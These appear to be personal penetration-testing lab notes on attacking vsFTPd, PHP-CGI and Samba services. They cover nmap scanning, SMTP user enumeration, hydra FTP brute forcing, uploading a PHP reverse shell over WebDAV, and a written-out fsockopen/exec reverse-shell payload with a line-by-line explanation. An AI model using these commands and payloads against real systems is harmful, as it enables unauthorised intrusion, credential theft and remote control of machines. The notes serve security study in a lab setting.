

#### Port scanning & enumeration 

- service versoin detection scan on target system `nmap -sV -p1-10000 target -oN nmap_10k.txt 
- manual banner grabbing if nmap does not provide any results: `nc - nv ip port`

![[Pasted image 20230916125239.png]] 
this port allowed a connection to a bind shell listener (root shell :O)


#### Targeting vsFTPd

- nmap port 21 
if anonymous login is allowed we can login without credentials
- ftp ip port (username:anonoymous emptypassword)
- `searchsploit vsftpd `
- `searchsploit -m exploitdb_id 
- analyze exploit with `vim` 
- `chmod +x file`
- `python3 file ip `

it is possible that this does not work bc the port used in this exploit can be removed  by the administrator (check port wit nmap) -> exploits might not work bc they have been patched. 

- `nmap -sV -p 25 ip (SMTP)`
smtp gives you easy way to identify user accounts on target system. 
	- use msfconsole
	- search smtp_enum 
 accounts: add them to textfile. 

Use the account `service` in the bruteforce, not interesting to use service accounts for bruteforce. Only use user-accounts in bruteforce
ftp bruteforce: `hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt target protocol `

Connect to ftp with credentials of useraccount
- `pwd` (if result is /home/service that that confirms that this is a user-account)
- `cd /`
- visit webserver in browser
	- Use webdav to get reverse shell 
		- `ls -al /usr/share/webshells/`
		- you need a php shell:  php-reverse-shell.php
		- copy file to current working directory: `cp /usr/share/webshells/php/php-reverse-shell.php . `
		- rename: `mv php-reverse-shell.php shell.php `
		- modify the file: change the ip to kali ip and the port should match with the port you will be listening on
			- set up netcat in other window: `nc -nvlp 1234 `
		- navigate to root of ftp (ftp stores everything under var)
			- `cd /var/www`
			- `cd dav` (only have rights to change this directory)
			- `put shell.php `
			- click on the file (the netcat listener window will show a connection, /bin/bash -i)





#### Targeting PHP

- run `nmap` service scan 
- visit webserver in browser 
	- what version of php is running? 
		- visit `/phpinfo.php` file in browser
	- `searchsploit php cgi `
	- `searchsploit -m 18836.py . `   (CGI Argument Injected )
	

![[Pasted image 20230916153801.png]]
![[Pasted image 20230916154248.png]]
modify pwn_code to provide us with a reverse shell
`
`**$sock=fsockopen("IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");** `
`
(IP = kali ip, port of listner)

Explanation: simple PHP script, this code creates a socket con'nection to a specified IP address and port, and then it executes an interactive shell (`/bin/sh -i`) that reads its input from and writes its output to that socket connection. This can be used for remote command execution,

1. `$sock = fsockopen("IP", 1234);`: This line uses the `fsockopen` function to create a network socket connection to the IP address specified in place of "IP" and the port 1234. The `fsockopen` function is often used in PHP to create socket connections to remote servers or services.
    
2. `exec("/bin/sh -i <&3 >&3 2>&3");`: After establishing the socket connection, this line uses the `exec` function to execute a shell command. The shell command being executed is `/bin/sh -i`, which typically invokes a Unix/Linux shell (e.g., Bash) in interactive mode (`-i`).
    
    - `<&3`: This part of the command redirects the standard input (stdin) of the shell to the socket connection represented by file descriptor 3. In this context, file descriptor 3 is assumed to be associated with the socket created in the previous line.
        
    - `>&3`: This part of the command redirects the standard output (stdout) of the shell to the same socket connection (file descriptor 3).
        
    - `2>&3`: This part redirects the standard error (stderr) of the shell to the same socket connection (file descriptor 3).

run exploit: python2 file ip port 

![[Pasted image 20230916154708.png]]
if you do not get a shell after executing change the 3 to 4: ![[Pasted image 20230916154849.png]]

`cat /etc/*release`
`uname -r`


#### Targeting SAMBA 

SMB implementation of Linux 

- `nmap -sV -p 445 ip `
- banner grabbing on port 445
- msfconsole: `search smb_version` 
- search vulnerabilities for version 
	- `searchsploit samba version `
	- in metasploit:` search samba version `
- use usermap_script 
- `cat /etc/*issue`
- `cat /etc/*release`
- upgrade session 
	- `sysinfo` 
	- `getuid`
	- `cat /etc/passwd `



